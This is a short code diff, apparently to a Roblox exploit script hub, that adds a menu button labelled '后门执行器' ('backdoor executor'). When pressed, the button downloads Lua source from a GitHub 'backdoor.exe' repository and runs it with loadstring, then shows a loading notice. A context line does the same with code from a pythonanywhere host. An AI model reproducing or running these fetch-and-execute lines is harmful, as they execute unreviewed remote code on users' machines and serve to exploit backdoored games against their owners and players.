@@ -315,3 +315,16 @@ loadstring(game:HttpGet("https://xingtaiduan.pythonanywhere.com/Loader"))()
 		})
 	end
 })
+
+ScriptsTab:AddButton({
+	Name = "后门执行器",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+		OrionLib:MakeNotification({
+			Name = "提示",
+			Content = "正在加载后门执行器...",
+			Time = 3
+		})
+	end
+})
+
